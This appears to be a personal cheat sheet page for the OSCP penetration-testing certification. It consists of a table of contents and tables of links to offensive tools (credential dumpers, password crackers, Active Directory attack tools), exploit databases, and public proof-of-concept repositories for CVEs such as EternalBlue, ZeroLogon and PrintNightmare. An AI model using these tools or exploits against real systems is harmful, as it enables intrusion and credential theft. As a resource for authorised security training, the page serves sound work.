<hr />
<h2>title: &quot;OSCP CheatSheet&quot;
date: 2023-10-16T13:29:42+02:00
url: &quot;/infos/oscp-cheatsheet&quot;</h2>
<h1>OSCP Cheat Sheet</h1>
<p>Commands, Payloads and Resources for the OffSec Certified Professional Certification (OSCP).</p>
<h2>Table of Contents</h2>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#basics">Basics</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#information-gathering">Information Gathering</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#vulnerability-analysis">Vulnerability Analysis</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#web-application-analysis">Web Application Analysis</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#password-attacks">Password Attacks</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#reverse-engineering">Reverse Engineering</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exploitation-tools">Exploitation Tools</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#post-exploitation">Post Exploitation</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exploit-databases">Exploit Databases</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cves">CVEs</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#payloads">Payloads</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#wordlists">Wordlists</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#social-media-resources">Social Media Resources</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#commands">Commands</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#basics-1">Basics</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#curl">curl</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#chisel">Chisel</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#file-transfer">File Transfer</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ftp">FTP</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#kerberos">Kerberos</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ligolo-ng">Ligolo-ng</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#linux">Linux</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#microsoft-windows">Microsoft Windows</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#php-webserver">PHP Webserver</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ping">Ping</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#python-webserver">Python Webserver</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#rdp">RDP</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#showmount">showmount</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#smbclient">smbclient</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#socat">socat</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ssh">SSH</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#time-and-date">Time and Date</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#tmux">Tmux</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#upgrading-shells">Upgrading Shells</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#virtualbox">VirtualBox</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#virtualenv">virtualenv</a></li>
</ul>
</li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#information-gathering-1">Information Gathering</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#memcached">memcached</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#netbios">NetBIOS</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#nmap">Nmap</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#port-scanning">Port Scanning</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#snmpwalk">snmpwalk</a></li>
</ul>
</li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#web-application-analysis-1">Web Application Analysis</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#burp-suite">Burp Suite</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cadaver">cadaver</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ffuf">ffuf</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#gobuster">Gobuster</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#gittools">GitTools</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#local-file-inclusion-lfi">Local File Inclusion (LFI)</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#pdf-php-inclusion">PDF PHP Inclusion</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#php-upload-filter-bypasses">PHP Upload Filter Bypasses</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#php-filter-chain-generator">PHP Filter Chain Generator</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#php-generic-gadget-chains-phpggc">PHP Generic Gadget Chains (PHPGGC)</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#server-side-template-injection-ssti">Server-Side Template Injection (SSTI)</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#upload-vulnerabilities">Upload Vulnerabilities</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#wfuzz">wfuzz</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#wpscan">WPScan</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#xml-external-entity-xxe">XML External Entity (XXE)</a></li>
</ul>
</li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#database-analysis">Database Analysis</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mongodb">MongoDB</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mssql">MSSQL</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mysql">MySQL</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#nosql-injection">NoSQL Injection</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#postgresql">PostgreSQL</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#redis">Redis</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sqlcmd">sqlcmd</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sql-injection">SQL Injection</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sql-truncation-attack">SQL Truncation Attack</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sqlite3">sqlite3</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sqsh">sqsh</a></li>
</ul>
</li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#password-attacks-1">Password Attacks</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#crackmapexec">CrackMapExec</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#fcrack">fcrack</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#hashcat">hashcat</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#hydra">Hydra</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#john">John</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#kerbrute">Kerbrute</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#lazagne">LaZagne</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mimikatz">mimikatz</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#pypykatz">pypykatz</a></li>
</ul>
</li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exploitation-tools-1">Exploitation Tools</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#imagetragick">ImageTragick</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#msl--polyglot-attack">MSL / Polyglot Attack</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#metasploit">Metasploit</a></li>
</ul>
</li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#post-exploitation-1">Post Exploitation</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#adcstemplate">ADCSTemplate</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#bloodhound">BloodHound</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#bloodhound-python">BloodHound Python</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#bloodyAD">bloodyAD</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#certify">Certify</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#certipy">Certipy</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#enum4linux-ng">enum4linux-ng</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#evil-winrm">Evil-WinRM</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#impacket-1">Impacket</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#jaws">JAWS</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#kerberos-1">Kerberos</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ldapsearch">ldapsearch</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#linux-1">Linux</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#microsoft-windows-1">Microsoft Windows</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#passthecert">PassTheCert</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#pkinittools">PKINITtools</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#port-scanning">Port Scanning</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#powercat">powercat</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#powermad">Powermad</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#powershell">PowerShell</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#pwncat">pwncat</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#rpcclient">rpcclient</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#rubeus">Rubeus</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#runascs">RunasCs</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#smbpasswd">smbpasswd</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#winexe">winexe</a></li>
</ul>
</li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve">CVE</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2014-6271-shellshock-rce-poc">CVE-2014-6271: Shellshock RCE PoC</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2016-1531-exim-lpe">CVE-2016-1531: exim LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2019-14287-sudo-bypass">CVE-2019-14287: Sudo Bypass</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2020-1472-zerologon-pe">CVE-2020-1472: ZeroLogon PE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2021-3156-sudo--sudoedit-lpe">CVE-2021–3156: Sudo / sudoedit LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2021-44228-log4shell-rce-0-day">CVE-2021-44228: Log4Shell RCE (0-day)</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2022-0847-dirty-pipe-lpe">CVE-2022-0847: Dirty Pipe LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2022-22963-spring4shell-rce-0-day">CVE-2022-22963: Spring4Shell RCE (0-day)</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2022-30190-ms-msdt-follina-rce">CVE-2022-30190: MS-MSDT Follina RCE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2022-31214-firejail-lpe">CVE-2022-31214: Firejail LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-21746-windows-ntlm-eop-localpotato-lpe">CVE-2023-21746: Windows NTLM EoP LocalPotato LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-22809-sudo-bypass">CVE-2023-22809: Sudo Bypass</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-23397-microsoft-outlook-click-to-run-pe-0-day-powershell-implementation">CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day">CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-4911-looney-tunables-lpe">CVE-2023-4911: Looney Tunables LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#godpotato-lpe">GodPotato LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#juicy-potato-lpe">Juicy Potato LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#juicypotatong-lpe">JuicyPotatoNG LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe">MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#printspoofer-lpe">PrintSpoofer LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sharpefspotato-lpe">SharpEfsPotato LPE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#shocker-container-escape">Shocker Container Escape</a></li>
</ul>
</li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#payloads-1">Payloads</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#donut">Donut</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exiftool">Exiftool</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ghostscript">GhostScript</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#nishang">nishang</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#reverse-shells">Reverse Shells</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#scarecrow">ScareCrow</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#shikata-ga-nai">Shikata Ga Nai</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#web-shells">Web Shells</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ysoserial">ysoserial</a></li>
</ul>
</li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#templates">Templates</a>
<ul>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#aspx-web-shell">ASPX Web Shell</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#bad-yaml">Bad YAML</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exploit-skeleton-python-script">Exploit Skeleton Python Script</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#json-post-request">JSON POST Rrequest</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#python-pickle-rce">Python Pickle RCE</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#python-redirect-for-ssrf">Python Redirect for SSRF</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#python-web-request">Python Web Request</a></li>
<li><a href="https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#xml-external-entity-xxe">XML External Entity (XXE)</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3>Basics</h3>
<p>| Name | URL |
| --- | --- |
| Chisel | https://github.com/jpillora/chisel |
| CyberChef | https://gchq.github.io/CyberChef |
| Swaks | https://github.com/jetmore/swaks |</p>
<h3>Information Gathering</h3>
<p>| Name | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |</p>
<h3>Vulnerability Analysis</h3>
<p>| Name | URL |
| --- | --- |
| nikto | https://github.com/sullo/nikto |
| Sparta | https://github.com/SECFORCE/sparta |</p>
<h3>Web Application Analysis</h3>
<p>| Name | URL |
| --- | --- |
| ffuf | https://github.com/ffuf/ffuf |
| fpmvuln | https://github.com/hannob/fpmvuln |
| Gobuster | https://github.com/OJ/gobuster |
| JSON Web Tokens | https://jwt.io |
| JWT_Tool | https://github.com/ticarpi/jwt_tool |
| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
| PHPGGC | https://github.com/ambionics/phpggc |
| Spose | https://github.com/aancw/spose |
| Wfuzz | https://github.com/xmendez/wfuzz |
| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
| WPScan | https://github.com/wpscanteam/wpscan |
| ysoserial | https://github.com/frohoff/ysoserial |</p>
<h3>Password Attacks</h3>
<p>| Name | URL |
| --- | --- |
| CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |
| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| Firefox Decrypt | https://github.com/unode/firefox_decrypt |
| hashcat | https://hashcat.net/hashcat |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John | https://github.com/openwall/john |
| keepass-dump-masterkey | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | https://github.com/ropnop/kerbrute |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| Patator | https://github.com/lanjelot/patator |
| pypykatz | https://github.com/skelsec/pypykatz |
| RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
| SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |</p>
<h3>Reverse Engineering</h3>
<p>| Name | URL |
| --- | --- |
| AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
| binwalk | https://github.com/ReFirmLabs/binwalk |
| cutter | https://github.com/rizinorg/cutter |
| dnSpy | https://github.com/dnSpy/dnSpy |
| GEF | https://github.com/hugsy/gef |
| ghidra | https://github.com/NationalSecurityAgency/ghidra |
| ImHex | https://github.com/WerWolv/ImHex |
| JD-GUI | https://github.com/java-decompiler/jd-gui |
| peda | https://github.com/longld/peda |
| pwndbg | https://github.com/pwndbg/pwndbg |
| Radare2 | https://github.com/radareorg/radare2 |</p>
<h3>Exploitation Tools</h3>
<p>| Name | URL |
| --- | --- |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| ImageTragick | https://imagetragick.com |
| Metasploit | https://github.com/rapid7/metasploit-framework |
| MSL / Polyglot Attack | https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html |</p>
<h3>Post Exploitation</h3>
<p>| Name | URL |
| --- | --- |
| ADCSKiller - An ADCS Exploitation Automation Tool | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
| BloodHound Docker | https://github.com/belane/docker-bloodhound |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| BloodHound | https://github.com/ly4k/BloodHound |
| BloodHound Python | https://github.com/fox-it/BloodHound.py |
| Certify | https://github.com/GhostPack/Certify |
| Certipy | https://github.com/ly4k/Certipy |
| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
| Ghostpack-CompiledBinaries | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
| GTFOBins | https://gtfobins.github.io |
| Impacket | https://github.com/fortra/impacket |
| Impacket Static Binaries | https://github.com/ropnop/impacket_static_binaries |
| JAWS | https://github.com/411Hall/JAWS |
| KrbRelay | https://github.com/cube0x0/KrbRelay |
| KrbRelayUp | https://github.com/Dec0ne/KrbRelayUp |
| Krbrelayx | https://github.com/dirkjanm/krbrelayx |
| LAPSDumper | https://github.com/n00py/LAPSDumper |
| LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LinEnum | https://github.com/rebootuser/LinEnum |
| LOLBAS | https://lolbas-project.github.io |
| lsassy | https://github.com/Hackndo/lsassy |
| nanodump | https://github.com/helpsystems/nanodump |
| PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| PKINITtools | https://github.com/dirkjanm/PKINITtools |
| powercat | https://github.com/besimorhino/powercat |
| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
| PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PowerView.py | https://github.com/aniqfakhrul/powerview.py |
| PPLdump | https://github.com/itm4n/PPLdump |
| Priv2Admin | https://github.com/gtworek/Priv2Admin |
| PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
| pspy | https://github.com/DominicBreuker/pspy |
| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
| pwncat | https://github.com/calebstewart/pwncat |
| PyWhisker | https://github.com/ShutdownRepo/pywhisker |
| Rubeus | https://github.com/GhostPack/Rubeus |
| RunasCs | https://github.com/antonioCoco/RunasCs |
| RustHound | https://github.com/OPENCYBER-FR/RustHound |
| scavenger | https://github.com/SpiderLabs/scavenger |
| SharpCollection | https://github.com/Flangvik/SharpCollection |
| SharpHound | https://github.com/BloodHoundAD/SharpHound |
| SharpView | https://github.com/tevora-threat/SharpView |
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| Villain | https://github.com/t3l3machus/Villain |
| WADComs | https://wadcoms.github.io |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Whisker | https://github.com/eladshamir/Whisker |
| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |</p>
<h3>Exploit Databases</h3>
<p>| Database | URL |
| --- | --- |
| 0day.today Exploit Database | https://0day.today |
| Exploit Database | https://www.exploit-db.com |
| Packet Storm | https://packetstormsecurity.com |
| Sploitus | https://sploitus.com |</p>
<h3>CVEs</h3>
<p>| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon PE Checker &amp; Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
